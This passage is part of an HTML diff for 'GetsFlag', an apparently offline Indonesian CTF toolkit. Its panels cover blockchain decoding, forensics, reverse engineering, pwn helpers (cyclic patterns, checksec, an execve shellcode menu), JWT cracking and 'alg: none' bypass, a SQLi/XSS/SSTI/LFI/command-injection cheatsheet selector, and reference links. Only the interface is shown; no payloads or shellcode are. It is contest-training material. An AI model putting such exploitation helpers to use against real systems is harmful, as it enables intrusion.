+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0 .67-1.34V9a1.65 1.65 0 0 0-.67-1.34l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 .67 1.34l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33z"/></svg>Utilitas
+        </button>
+      </div>
+
+      <!-- Tabpanel: Blockchain Auto -->
+      <div class="tabpanel" data-group="bc" data-tab="auto">
+        <div class="card" style="border-color:var(--red-dim-bd)">
+          <h2>Auto-detect: tinggal paste data on-chain</h2>
+          <p class="sub" style="margin-bottom:10px">Tempel calldata hex, daftar byte desimal, alamat atau hash keccak. Sistem mengurai tipe data, selector, word ABI, dan menangkap flag.</p>
+          <textarea id="bc_auto_in" class="textarea" placeholder="0x47455453464c41477b… · 0xa9059cbb… · 0xd8da6bf26964af9d7eed9e03e53415d37aa96045"></textarea>
+          <div class="row" style="margin-top:12px">
+            <button class="btn btn--primary" onclick="runBlockchainAuto()">Auto-detect On-Chain</button>
+          </div>
+          <div id="bc_auto_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Keccak & Selector -->
+      <div class="tabpanel" data-group="bc" data-tab="hash" hidden>
+        <div class="card">
+          <h2>keccak-256</h2>
+          <label class="lbl" for="bc_kin">Input (teks biasa, atau centang bila berupa hex)</label>
+          <input id="bc_kin" class="input" placeholder="misal: satoshi · 0xdeadbeef">
+          <div class="row" style="margin-top:10px">
+            <label class="check"><input type="checkbox" id="bc_khex"><span class="box"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span>input hex</label>
+            <button class="btn btn--primary" onclick="calcKeccak()">Hitung keccak256</button>
+          </div>
+          <div id="bc_kout"></div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h2>Selector Fungsi / Topic Event</h2>
+          <label class="lbl" for="bc_sig">Signature fungsi atau event (tanpa spasi)</label>
+          <div class="row">
+            <div class="grow"><input id="bc_sig" class="input" placeholder="transfer(address,uint256)"></div>
+            <button class="btn btn--primary" onclick="calcSelector()">Hitung Selector</button>
+          </div>
+          <div id="bc_sout"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Decode ABI -->
+      <div class="tabpanel" data-group="bc" data-tab="abi" hidden>
+        <div class="card">
+          <h2>Decode ABI / Calldata</h2>
+          <label class="lbl" for="bc_abi">Hex calldata (dengan atau tanpa selector 4-byte di awal)</label>
+          <textarea id="bc_abi" class="textarea sm" placeholder="0xa9059cbb0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc40000000000000000000000000000000000000000000000000de0b6b3a7640000"></textarea>
+          <div class="row" style="margin-top:12px">
+            <button class="btn btn--primary" onclick="decodeABI()">Decode Calldata</button>
+          </div>
+          <div id="bc_aout"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Alamat Kontrak -->
+      <div class="tabpanel" data-group="bc" data-tab="addr" hidden>
+        <div class="card">
+          <h2>Derivasi Alamat Kontrak (CREATE & CREATE2)</h2>
+          <p class="sub" style="margin-bottom:12px">CREATE = keccak256(RLP([deployer, nonce]))[12:]. CREATE2 = keccak256(0xff ++ deployer ++ salt ++ keccak256(init_code))[12:].</p>
+          <div class="sec-title">1. Derivasi CREATE</div>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="create_sender">Deployer Address (20 byte)</label><input id="create_sender" class="input" placeholder="0xd8da6bf26964af9d7eed9e03e53415d37aa96045"></div>
+            <div style="width:120px"><label class="lbl" for="create_nonce">Nonce</label><input id="create_nonce" type="number" class="input" value="0"></div>
+            <button class="btn btn--secondary" style="margin-top:auto" onclick="calcCreate()">Hitung CREATE</button>
+          </div>
+          <div id="create_out"></div>
+
+          <div class="sec-title" style="margin-top:20px">2. Derivasi CREATE2</div>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="c2_deployer">Deployer Address</label><input id="c2_deployer" class="input" placeholder="0x…"></div>
+            <div class="grow"><label class="lbl" for="c2_salt">Salt (hex 32-byte)</label><input id="c2_salt" class="input" placeholder="0x00… atau angka"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="c2_code">Init Code (hex) atau Init Code Hash</label><input id="c2_code" class="input" placeholder="Bytecode atau hash keccak 32-byte"></div>
+            <button class="btn btn--secondary" style="margin-top:auto" onclick="calcCreate2()">Hitung CREATE2</button>
+          </div>
+          <div id="c2_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Utilitas -->
+      <div class="tabpanel" data-group="bc" data-tab="util" hidden>
+        <div class="card">
+          <h2>EIP-55 Checksum Formatter</h2>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="eip55_in">Alamat Ethereum (huruf kecil/besar)</label><input id="eip55_in" class="input" placeholder="0xd8da6bf26964af9d7eed9e03e53415d37aa96045"></div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="formatEIP55()">Format EIP-55</button>
+          </div>
+          <div id="eip55_out"></div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h2>Unit Converter: Wei, Gwei, Ether</h2>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="unit_val">Nilai</label><input id="unit_val" class="input" value="1"></div>
+            <div style="width:160px">
+              <label class="lbl" for="unit_type">Dari Unit</label>
+              <select id="unit_type" class="select" onchange="convertEtherUnits()">
+                <option value="ether">Ether (10^18 Wei)</option>
+                <option value="gwei">Gwei (10^9 Wei)</option>
+                <option value="wei">Wei</option>
+              </select>
+            </div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="convertEtherUnits()">Konversi</button>
+          </div>
+          <div id="unit_out"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FORENSICS VIEW -->
+    <section id="view-forensics" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Forensik Digital</h1>
+        <p class="sub">Upload file: file / exiftool / strings / binwalk / hexdump + cek stego, PCAP & dokumen Office, gaya Aperisolve.</p>
+      </div>
+
+      <div class="subtabs" role="tablist" data-group="forensics">
+        <button class="subtab is-active" data-tab="auto" role="tab" aria-selected="true">Analisa Otomatis</button>
+        <button class="subtab" data-tab="pcap" role="tab" aria-selected="false">Analisa PCAP</button>
+        <button class="subtab" data-tab="office" role="tab" aria-selected="false">Dokumen / Office</button>
+        <button class="subtab" data-tab="strings" role="tab" aria-selected="false">Strings & Hexdump</button>
+      </div>
+
+      <!-- Tabpanel: Auto -->
+      <div class="card tabpanel" data-group="forensics" data-tab="auto">
+        <p class="sub" style="margin-top:0">Identifikasi magic byte, hitung Shannon Entropy (0.0 - 8.0), carver stego PNG/JPEG/ZIP & buru flag otomatis.</p>
+        <label class="dropzone" for="for_file">
+          <input type="file" id="for_file" onchange="handleForensicsFile(this.files[0])">
+          <span class="dz-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></span>
+          <span class="dz-main"><span class="pick">Pilih file</span> atau seret ke sini</span>
+          <span class="dz-sub" id="for_file_name">Maksimal 25 MB</span>
+        </label>
+        <div id="for_auto_out" style="margin-top:14px"></div>
+      </div>
+
+      <!-- Tabpanel: PCAP -->
+      <div class="card tabpanel" data-group="forensics" data-tab="pcap" hidden>
+        <p class="sub" style="margin-top:0">Baca tangkapan jaringan .pcap: parsing frame, deteksi HTTP, DNS query, payload ICMP, serta carver flag lintas stream.</p>
+        <label class="dropzone" for="for_pcap_file">
+          <input type="file" id="for_pcap_file" onchange="handlePCAPFile(this.files[0])">
+          <span class="dz-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg></span>
+          <span class="dz-main"><span class="pick">Pilih file .pcap</span> atau seret ke sini</span>
+          <span class="dz-sub" id="for_pcap_name">pcap standar, maks 25 MB</span>
+        </label>
+        <div id="for_pcap_out" style="margin-top:14px"></div>
+      </div>
+
+      <!-- Tabpanel: Office -->
+      <div class="card tabpanel" data-group="forensics" data-tab="office" hidden>
+        <p class="sub" style="margin-top:0">Bongkar DOCX / XLSX / PPTX / PDF: metadata (author/title), sheet tersembunyi, komentar, makro (vbaProject.bin), serta teks PDF.</p>
+        <label class="dropzone" for="for_office_file">
+          <input type="file" id="for_office_file" onchange="handleOfficeFile(this.files[0])">
+          <span class="dz-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></span>
+          <span class="dz-main"><span class="pick">Pilih berkas Office / PDF</span></span>
+          <span class="dz-sub" id="for_office_name">docx, xlsx, pptx, pdf</span>
+        </label>
+        <div id="for_office_out" style="margin-top:14px"></div>
+      </div>
+
+      <!-- Tabpanel: Strings & Hexdump -->
+      <div class="card tabpanel" data-group="forensics" data-tab="strings" hidden>
+        <h2>Strings Harvester & Formatted Hexdump</h2>
+        <label class="lbl" for="strings_in">Input Teks / Hex Bytes</label>
+        <textarea id="strings_in" class="textarea sm" placeholder="Paste data hex atau upload file di tab Analisa Otomatis…"></textarea>
+        <div class="row" style="margin-top:10px">
+          <button class="btn btn--primary" onclick="extractStringsDirect()">Ekstrak Strings & Flag</button>
+          <button class="btn btn--secondary" onclick="generateHexdump()">Formatted Hexdump</button>
+        </div>
+        <div id="strings_out"></div>
+      </div>
+    </section>
+
+    <!-- REVERSE ENGINEERING VIEW -->
+    <section id="view-reverse" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Reverse Engineering</h1>
+        <p class="sub">Decompile .pyc / .class / .jar + disassembly ELF (objdump), inversi algoritma & sequence XOR, gaya Dogbolt.</p>
+      </div>
+
+      <div class="subtabs" role="tablist" data-group="reverse">
+        <button class="subtab is-active" data-tab="decompile" role="tab" aria-selected="true">Decompile / Upload</button>
+        <button class="subtab" data-tab="elfpe" role="tab" aria-selected="false">ELF & PE Inspector</button>
+        <button class="subtab" data-tab="pyc" role="tab" aria-selected="false">Python .pyc Bytecode</button>
+        <button class="subtab" data-tab="inversion" role="tab" aria-selected="false">Algorithmic Inverter</button>
+        <button class="subtab" data-tab="seqxor" role="tab" aria-selected="false">Sequence-Key XOR</button>
+      </div>
+
+      <!-- Tabpanel: Decompile Upload -->
+      <div class="card tabpanel" data-group="reverse" data-tab="decompile">
+        <p class="sub" style="margin-top:0">Upload .pyc (Python), .class/.jar (Java), atau ELF/PE (Linux/Windows). Analisa header, konstanta bytecode, serta string tersembunyi.</p>
+        <label class="dropzone" for="rev_file">
+          <input type="file" id="rev_file" onchange="handleReverseFile(this.files[0])">
+          <span class="dz-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></span>
+          <span class="dz-main"><span class="pick">Pilih file biner</span> atau seret ke sini</span>
+          <span class="dz-sub" id="rev_file_name">.pyc, .class, .jar, ELF, PE (maks 25 MB)</span>
+        </label>
+        <div id="rev_out" style="margin-top:14px"></div>
+      </div>
+
+      <!-- Tabpanel: ELF & PE Inspector -->
+      <div class="card tabpanel" data-group="reverse" data-tab="elfpe" hidden>
+        <h2>ELF & PE Header Inspector</h2>
+        <p class="sub" style="margin-bottom:12px">Bongkar executable header: bitness (32/64-bit), endianness, CPU architecture, entrypoint address, dan section headers.</p>
+        <label class="lbl" for="elf_hex_in">Hex Bytes Header (minimal 64 byte)</label>
+        <textarea id="elf_hex_in" class="textarea sm" placeholder="7f 45 4c 46 02 01 01 00… atau 4d 5a 90 00…"></textarea>
+        <div class="row" style="margin-top:10px">
+          <button class="btn btn--primary" onclick="parseExecHeader()">Inspeksi Header Biner</button>
+        </div>
+        <div id="elf_header_out"></div>
+      </div>
+
+      <!-- Tabpanel: Python .pyc Bytecode -->
+      <div class="card tabpanel" data-group="reverse" data-tab="pyc" hidden>
+        <h2>Python .pyc Bytecode Inspector</h2>
+        <p class="sub" style="margin-bottom:12px">Identifikasi magic number versi Python (Python 2.7 hingga 3.13), PEP 552 timestamp/bitfield, dan ekstrak constant pool strings.</p>
+        <label class="lbl" for="pyc_hex_in">Hex Bytes .pyc</label>
+        <textarea id="pyc_hex_in" class="textarea sm" placeholder="6f 0d 0d 0a 00 00 00 00…"></textarea>
+        <div class="row" style="margin-top:10px">
+          <button class="btn btn--primary" onclick="parsePycHeader()">Bedah Bytecode .pyc</button>
+        </div>
+        <div id="pyc_out"></div>
+      </div>
+
+      <!-- Tabpanel: Algorithmic Inverter -->
+      <div class="card tabpanel" data-group="reverse" data-tab="inversion" hidden>
+        <h2>Algorithmic Transform & Inversion Reverser</h2>
+        <p class="sub" style="margin-bottom:12px">Balikkan transformasi aritmatika/bitwise: ROL/ROR (1-7 bit), penambahan/pengurangan modulo 256, bitwise NOT, dan indexed XOR (i*A + B).</p>
+        <label class="lbl" for="inv_in">Cipher Bytes (Hex)</label>
+        <input id="inv_in" class="input" placeholder="47 45 54 53 46 4c 41 47…">
+        <div class="row" style="margin-top:10px">
+          <select id="inv_op" class="select" style="min-width:200px">
+            <option value="rol">Inversi ROL ke ROR (1 bit)</option>
+            <option value="ror">Inversi ROR ke ROL (1 bit)</option>
+            <option value="not">Bitwise NOT (~byte)</option>
+            <option value="sub">Pengurangan Modulo (C - K mod 256)</option>
+            <option value="add">Penambahan Modulo (C + K mod 256)</option>
+            <option value="idx_xor">Indexed XOR (C ^ (i * A + B))</option>
+          </select>
+          <input id="inv_param" class="input" placeholder="Key K atau A,B" style="max-width:140px">
+          <button class="btn btn--primary" onclick="runInversion()">Inversi Algoritma</button>
+        </div>
+        <div id="inv_out"></div>
+      </div>
+
+      <!-- Tabpanel: Sequence-Key XOR -->
+      <div class="card tabpanel" data-group="reverse" data-tab="seqxor" hidden>
+        <h2>Sequence-Key XOR Reverser</h2>
+        <p class="sub" style="margin-bottom:12px">XOR dekripsi menggunakan deret matematika deterministik: Bilangan Prima, Fibonacci, Lucas, Bilangan Segitiga, dan Bilangan Kuadrat.</p>
+        <label class="lbl" for="seq_in">Cipher Bytes (Hex)</label>
+        <input id="seq_in" class="input" placeholder="47 45 54 53 46…">
+        <div class="row" style="margin-top:10px">
+          <select id="seq_type" class="select" style="min-width:180px">
+            <option value="primes">Bilangan Prima (2, 3, 5, 7, 11, 13…)</option>
+            <option value="fibonacci">Fibonacci (1, 1, 2, 3, 5, 8, 13…)</option>
+            <option value="lucas">Lucas (2, 1, 3, 4, 7, 11, 18…)</option>
+            <option value="triangular">Bilangan Segitiga (1, 3, 6, 10, 15…)</option>
+            <option value="squares">Bilangan Kuadrat (1, 4, 9, 16, 25…)</option>
+          </select>
+          <button class="btn btn--primary" onclick="runSeqXOR()">Pecahkan Sequence XOR</button>
+        </div>
+        <div id="seq_out"></div>
+      </div>
+    </section>
+
+    <!-- BINARY EXPLOITATION VIEW -->
+    <section id="view-pwn" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Binary Exploitation</h1>
+        <p class="sub">Helper pwn: cyclic pattern & offset, checksec, ROP gadget. Analisa lokal: tak menembak target.</p>
+      </div>
+
+      <div class="card">
+        <h2>Cyclic Pattern (De Bruijn Sequence)</h2>
+        <p class="sub" style="margin-bottom:12px">Generate pola De Bruijn non-repeating untuk memicu crash buffer overflow dan temukan offset presisi register RSP/EIP.</p>
+        <div class="row">
+          <div class="grow"><label class="lbl" for="clen">Panjang Pola</label><input type="number" id="clen" class="input" value="200" min="1" max="50000"></div>
+          <button class="btn btn--primary" style="margin-top:auto" onclick="genCyclic()">Generate Pattern</button>
+        </div>
+        <div id="cout"></div>
+
+        <div class="row" style="margin-top:18px">
+          <div class="grow">
+            <label class="lbl" for="cval">Cari Offset (Crash value RSP/EIP, misal: <code>0x61616162</code> atau <code>baaa</code>)</label>
+            <input type="text" id="cval" class="input" placeholder="0x61616162 atau baaa">
+          </div>
+          <button class="btn btn--secondary" style="margin-top:auto" onclick="findCyclic()">Cari Offset</button>
+        </div>
+        <div id="fout"></div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h2>Analisa ELF (Checksec Auditor)</h2>
+        <p class="sub" style="margin-bottom:12px">Audit proteksi biner: Stack Canary, NX / DEP, PIE / ASLR, dan RELRO.</p>
+        <label class="dropzone" for="elf_file">
+          <input type="file" id="elf_file" onchange="handleELFChecksec(this.files[0])">
+          <span class="dz-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg></span>
+          <span class="dz-main"><span class="pick">Pilih ELF</span> atau seret ke sini</span>
+          <span class="dz-sub" id="elf_file_name">Biner ELF Linux 32/64-bit</span>
+        </label>
+        <div id="eout" style="margin-top:14px"></div>
+      </div>
+
+      <div class="card" style="margin-top:16px">
+        <h2>ROP Gadgets & Shellcode Library</h2>
+        <p class="sub" style="margin-bottom:12px">Snippet shellcode umum x86/x64 Linux (/bin/sh) dan template script pwntools siap pakai.</p>
+        <div class="row">
+          <select id="sc_arch" class="select" onchange="renderShellcode(this.value)">
+            <option value="x64_execve">Linux x86_64 Execve /bin/sh (27 bytes)</option>
+            <option value="x86_execve">Linux x86 Execve /bin/sh (23 bytes)</option>
+            <option value="pwntools_skel">Template Exploit Pwntools Python</option>
+          </select>
+          <button class="btn btn--primary" onclick="renderShellcode(document.getElementById('sc_arch').value)">Muat Snippet</button>
+        </div>
+        <div id="sc_out" style="margin-top:12px"></div>
+      </div>
+    </section>
+
+    <!-- WEB EXPLOITATION VIEW -->
+    <section id="view-web" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Web Exploitation</h1>
+        <p class="sub">JWT decode/crack, encoder/decoder, hash generator, cheatsheet payload. Generator sisi-aman (tak ada request keluar dari server).</p>
+      </div>
+
+      <div class="subtabs" role="tablist" data-group="web">
+        <button class="subtab is-active" data-tab="jwt" role="tab" aria-selected="true">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"/><path d="m10.7 12.3 8.5-8.5M16 6l2 2M20 2l2 2-3 3-2-2z"/></svg>JWT
+        </button>
+        <button class="subtab" data-tab="enc" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Encoder / Decoder
+        </button>
+        <button class="subtab" data-tab="hash" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>Hash
+        </button>
+        <button class="subtab" data-tab="cheat" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>Cheatsheet
+        </button>
+      </div>
+
+      <!-- Tabpanel: JWT -->
+      <div class="tabpanel" data-group="web" data-tab="jwt">
+        <div class="card">
+          <label class="lbl" for="jwt_in">Token JWT</label>
+          <textarea id="jwt_in" class="textarea sm" placeholder="eyJ…header.eyJ…payload.sig"></textarea>
+          <div class="row" style="margin-top:12px">
+            <button class="btn btn--primary" onclick="jwtDecode()">Decode Token</button>
+            <button class="btn btn--secondary" onclick="jwtCrack()">Crack HS256</button>
+            <button class="btn btn--dim" onclick="jwtBypassNone()">Bypass alg: none</button>
+          </div>
+          <div id="jwt_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Encoder / Decoder -->
+      <div class="tabpanel" data-group="web" data-tab="enc" hidden>
+        <div class="card">
+          <label class="lbl" for="enc_in">Input Teks</label>
+          <textarea id="enc_in" class="textarea sm" placeholder="Ketik atau paste teks…"></textarea>
+          <div class="row" style="margin-top:12px">
+            <select id="enc_op" class="select" style="max-width:280px">
+              <option value="url_enc">URL Encode</option>
+              <option value="url_dec">URL Decode</option>
+              <option value="b64_enc">Base64 Encode</option>
+              <option value="b64_dec">Base64 Decode</option>
+              <option value="hex_enc">Hex Encode</option>
+              <option value="hex_dec">Hex Decode</option>
+              <option value="html_enc">HTML Entities Encode</option>
+              <option value="html_dec">HTML Entities Decode</option>
+              <option value="rot13">Rot13</option>
+              <option value="rot47">Rot47</option>
+              <option value="bin_enc">Binary (0101…)</option>
+              <option value="bin_dec">Binary Decode</option>
+            </select>
+            <button class="btn btn--primary" onclick="runEncoder()">Transform</button>
+          </div>
+          <div id="enc_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Hash -->
+      <div class="tabpanel" data-group="web" data-tab="hash" hidden>
+        <div class="card">
+          <div class="row">
+            <div>
+              <label class="lbl" for="hash_algo">Algoritma</label>
+              <select id="hash_algo" class="select" style="max-width:160px">
+                <option value="md5">MD5</option>
+                <option value="sha1">SHA-1</option>
+                <option value="sha256" selected>SHA-256</option>
+                <option value="sha512">SHA-512</option>
+                <option value="keccak256">Keccak-256</option>
+                <option value="ripemd160">RIPEMD-160</option>
+              </select>
+            </div>
+            <div class="grow">
+              <label class="lbl" for="hash_in">Teks Input</label>
+              <input id="hash_in" class="input" placeholder="Teks yang akan di-hash…">
+            </div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="calcWebHash()">Generate Hash</button>
+          </div>
+          <div id="hash_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Cheatsheet -->
+      <div class="tabpanel" data-group="web" data-tab="cheat" hidden>
+        <div class="card">
+          <h2>Cheatsheet Payload CTF</h2>
+          <p class="sub" style="margin-bottom:12px">Koleksi payload siap pakai untuk SQLi, XSS, SSTI, LFI, dan Command Injection dengan 1-click salin.</p>
+          <div class="row" style="margin-bottom:14px">
+            <select id="cheat_cat" class="select" onchange="renderCheatsheets(this.value)">
+              <option value="ALL">Semua Kategori</option>
+              <option value="Command Injection">Command Injection</option>
+              <option value="LFI">LFI (Local File Inclusion)</option>
+              <option value="SQLi">SQL Injection</option>
+              <option value="SSTI">SSTI (Server-Side Template Injection)</option>
+              <option value="XSS">XSS (Cross-Site Scripting)</option>
+            </select>
+          </div>
+          <div id="cheat_list"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- REFERENSI VIEW -->
+    <section id="view-referensi" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">&lt; &gt;</span>
+        <h1>Referensi & Tautan</h1>
+        <p class="sub">Kumpulan tools <b>online eksternal</b> pilihan per kategori CTF: buat latihan & lomba (picoCTF, CTFlearn, dll). Pelengkap tools GetsFlag yang berjalan offline di sini.</p>
+      </div>
+
+      <div class="infobox" style="margin-bottom:18px">
+        <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <span><b>Perhatian.</b> Tautan di bawah adalah layanan pihak ketiga di luar GetsFlag. Hormati aturan tiap situs, jangan unggah data sensitif, dan ingat sebagian situs mengirim data ke server mereka. Tools GetsFlag sendiri berjalan offline di browser tanpa koneksi keluar.</span>
+      </div>
+
+      <p class="ref-legend" style="color:var(--muted); font-size:12px; margin-bottom:14px">
+        <span class="star">★</span> = paling sering menyelamatkan saat lomba (wajib bookmark). Klik judul kategori untuk buka/tutup grup.
+      </p>
+
+      <div class="ref-groups">
+
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span><span class="gt">Cryptography</span><span class="cnt">8 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
+      <li><a class="refrow" href="https://www.dcode.fr/en" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">dCode</span><span class="star">★</span><span class="host">dcode.fr ↗</span></div><div class="ds">Identifier + ratusan cipher klasik &amp; tool matematika.</div></a></li>
+      <li><a class="refrow" href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">CyberChef</span><span class="star">★</span><span class="host">gchq.github.io/CyberChef ↗</span></div><div class="ds">Pipeline encode/decode/XOR, fitur “Magic” auto-detect.</div></a></li>
+      <li><a class="refrow" href="http://factordb.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">FactorDB</span><span class="star">★</span><span class="host">factordb.com ↗</span></div><div class="ds">Cek apakah modulus RSA n sudah pernah difaktorkan. Wajib.</div></a></li>
+      <li><a class="refrow" href="https://www.alpertron.com.ar/ECM.HTM" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Alpertron ECM</span><span class="star">★</span><span class="host">alpertron.com.ar ↗</span></div><div class="ds">Kalkulator faktorisasi integer (ECM/SIQS) di browser.</div></a></li>
+      <li><a class="refrow" href="https://sagecell.sagemath.org/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">SageMathCell</span><span class="host">sagecell.sagemath.org ↗</span></div><div class="ds">Jalankan Sage/Python untuk math kripto berat, tanpa install.</div></a></li>
+      <li><a class="refrow" href="https://quipqiup.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">quipqiup</span><span class="host">quipqiup.com ↗</span></div><div class="ds">Pemecah sandi substitusi / cryptogram otomatis.</div></a></li>
+      <li><a class="refrow" href="https://www.boxentriq.com/code-breaking" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Boxentriq</span><span class="host">boxentriq.com ↗</span></div><div class="ds">Identifier cipher + banyak solver interaktif.</div></a></li>
+      <li><a class="refrow" href="https://cryptii.com/" target="_blank" rel="noopener noreferrer"><div class="rr-top"><span class="nm">Cryptii</span><span class="host">cryptii.com ↗</span></div><div class="ds">Konversi &amp; encode/decode berantai modular.</div></a></li>
+    </ul>
+  </details>
+
+  <details class="refgroup" open>
+    <summary class="refgroup-head"><span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.3 7 12 12 20.7 7"/><line x1="12" y1="22" x2="12" y2="12"/></svg></span><span class="gt">Blockchain</span><span class="cnt">6 tautan</span><svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg></summary>
+    <ul class="reflist">
